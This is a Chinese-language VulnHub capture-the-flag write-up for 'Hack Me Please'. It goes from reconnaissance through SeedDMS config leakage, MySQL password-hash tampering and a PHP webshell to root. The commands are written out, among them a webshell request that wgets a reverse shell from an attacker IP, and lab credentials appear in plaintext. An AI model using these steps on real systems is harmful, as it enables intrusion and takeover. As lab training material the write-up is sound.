---
title: Hack Me Please (VulnHub Writeup)
date: 2021-09-02T23:11:00+08:00
draft: false
url: "/2021/09/02/hack-me-please-vulnhub-writeup/"
categories:
  - VulnHub
showToc: true
TocOpen: false
---

> 
URL : https://www.vulnhub.com/entry/hack-me-please-1,731/

IP : 192.168.1.111

## Recon

- 掃 Port`rustscan -a 192.168.1.111`![](/uploads/2022/02/3095b-GQ3XhCP.png)`nmap -A -p80,3306,33060 192.168.1.111`- ![](/uploads/2022/02/8cf4d-NgbBNJB.png)掃 Dir- `python3 dirsearch.py -u http://192.168.1.111/`![](/uploads/2022/02/25d9f-nC8b3F5.png)
- 看不出啥特別ㄉ觀察首頁- ![](/uploads/2022/02/52d77-qfWookP.png)觀察 `main.js`- ![](/uploads/2022/02/6a55e-Gnuznh1.png)
- 發現註解寫了一個 `/seeddms51x/seeddms-5.1.22` 的路徑![](/uploads/2022/02/5dc94-mUDfth8.png)

## DMS

- 掃路徑發現有 `install` 等資訊![](/uploads/2022/02/e0a7a-zidhCez.png)觀察原始碼- ![](/uploads/2022/02/2a7ed-fb02TAU.png)
- 到 SorceForge 下載原始碼觀察路徑- ![](/uploads/2022/02/81fb6-Ry12QOc.png)
- 發現路徑內有 `/conf/` 可能有重要的資訊`/conf/settings.xml` 可以存取- 裡面找到 mysql 的帳密 `seeddms`

## MySQL

- 進行 MySQL 連線![](/uploads/2022/02/70ebc-9kPLyD2.png)觀察 DB- ![](/uploads/2022/02/740d1-1949mIG.png)觀察表格- ![](/uploads/2022/02/c5b0f-tKUTHXI.png)`users`- ![](/uploads/2022/02/a95c4-pw1MWYq.png)
- ![](/uploads/2022/02/68521-GibIYc2.png)
- 找到一組帳密`saket`
- `saurav`
- `Saket@#$1337`但登入 DMS 失敗找到 `tblUsers`- ![](/uploads/2022/02/49c25-3tdrjpv.png)
- 分析 hash
- ![](/uploads/2022/02/626fa-iyjvDSu.png)應該是 md5哈希貓爆破- ![](/uploads/2022/02/30a72-I5MAAw3.png)
- 爆不出來QQ自己創一個使用者 `mysql INSERT INTO tblUsers (id,login,pwd,fullName,email,role,language,theme,comment) VALUES (3,"meow","4a4be40c96ac6314e91d93f38043a634","Meow","meow@meow.meow",1,"en_US",0,0);`- ![](/uploads/2022/02/34911-vF0oItn.png)
- ![](/uploads/2022/02/71831-ahHqKQA.png)可以登入，但畫面是白的 QQ改使用者密碼- 原本是 `f9ef2c539bad8a6d2f3432b6d49ab51a`先存著備用，怕以後要用到`update tblUsers set pwd='4a4be40c96ac6314e91d93f38043a634' where id=1;`- ![](/uploads/2022/02/6297e-PAzpNXC.png)
- 就登入成功ㄌ上傳 webshell因為 `seeddms51x` 目錄沒有鎖權限- 根據觀察，檔案會存在 `http://192.168.1.111/seeddms51x/data/1048576/{檔案ID}/1.{檔案附檔名}`![](/uploads/2022/02/893e4-8K0Y0IX.png)載 Reverse shell- http://192.168.1.111/seeddms51x/data/1048576/4/1.php?A=wget%20192.168.1.109:8000/s_l接上 Reverse shell- 使用交互式`python3 -c 'import pty; pty.spawn("/bin/bash")'`切換使用者- ![](/uploads/2022/02/68782-sU18oMU.png)
- 使用當初 DB 看到的密碼提權- `sudo -l` 發現可以直接成為 root![](/uploads/2022/02/24681-Q9bgJGa.png)
